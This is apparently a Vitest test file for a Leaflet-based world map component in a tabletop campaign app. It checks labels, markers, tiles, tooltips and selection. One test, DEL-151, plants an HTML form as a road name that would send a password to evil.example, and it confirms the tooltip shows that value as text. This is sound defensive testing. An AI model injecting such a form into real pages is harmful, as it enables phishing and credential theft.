import { render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { I18nProvider } from "../i18n";
import { seatView } from "./testing";
import WorldMapView from "./WorldMapView";

function renderView(ui: React.ReactElement) {
  return render(<I18nProvider language="en">{ui}</I18nProvider>);
}

describe("WorldMapView", () => {
  it("mounts Leaflet with the places' labels, the party's marker, the journey and a scale bar", async () => {
    const { container, unmount } = renderView(<WorldMapView view={seatView()} tileUrl={null} />);
    const map = await screen.findByRole("region", { name: "The world map: Greyhawk region" });
    expect(map.classList.contains("leaflet-container")).toBe(true);
    await waitFor(() => expect(container.querySelector(".world-party")).toBeTruthy());
    expect(screen.getByTitle("The party")).toBeTruthy();
    const labels = [...container.querySelectorAll(".world-place-label")].map((label) => label.textContent);
    expect(labels).toEqual(["Greyhawk", "Hardby"]);
    // The journey: done solid, ahead dashed.
    expect(container.querySelector(".world-journey-done")).toBeTruthy();
    expect(container.querySelector(".world-journey-ahead")).toBeTruthy();
    expect(container.querySelector(".world-scale")?.textContent).toMatch(/mi$/);
    // No external picture: no Leaflet marker image, no attribution link.
    expect(container.querySelector("img.leaflet-marker-icon")).toBeNull();
    expect(container.querySelector(".leaflet-control-attribution")).toBeNull();
    unmount();
  });

  it("lays the picture's tiles under the fog, with a fog picture for the tiles that aren't sent", async () => {
    const view = seatView({ picture: { width_px: 1000, height_px: 700, km_per_px: 0.04, max_zoom: 2 } });
    const { container } = renderView(
      <WorldMapView view={view} tileUrl="/api/campaigns/c/world-maps/greyhawk-region/tiles/{z}/{x}/{y}?v=v1" />,
    );
    await waitFor(() => expect(container.querySelector(".leaflet-tile-container")).toBeTruthy());
    const tiles = [...container.querySelectorAll<HTMLImageElement>("img.leaflet-tile")].map((img) => img.src);
    expect(tiles.length).toBeGreaterThan(0);
    for (const src of tiles)
      expect(src).toMatch(/\/api\/campaigns\/c\/world-maps\/greyhawk-region\/tiles\/\d+\/\d+\/\d+\?v=v1$/);
  });

  it("shows a road's or a river's name in its tooltip as text, never as markup (DEL-151)", async () => {
    const name = '<form action="https://evil.example/"><input name="password"></form>The old road';
    const view = seatView();
    view.features = view.features.map((f) => (f.id === "old-road" ? { ...f, name } : f));
    const { container } = renderView(<WorldMapView view={view} tileUrl={null} />);
    await waitFor(() => expect(container.querySelector(".world-route")).toBeTruthy());
    container.querySelector(".world-route")?.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
    const tooltip = await waitFor(() => {
      const found = container.querySelector(".leaflet-tooltip");
      expect(found).toBeTruthy();
      return found!;
    });
    expect(tooltip.textContent).toBe(name);
    expect(tooltip.querySelector("form, input")).toBeNull();
  });

  it("tells which feature was picked", async () => {
    const onSelect = vi.fn();
    const { container } = renderView(<WorldMapView view={seatView()} tileUrl={null} onSelect={onSelect} />);
    await waitFor(() => expect(container.querySelector(".world-place")).toBeTruthy());
    const greyhawk = [...container.querySelectorAll(".world-place")].find((m) => m.textContent === "Greyhawk");
    greyhawk?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    expect(onSelect).toHaveBeenCalledWith("greyhawk");
  });
});
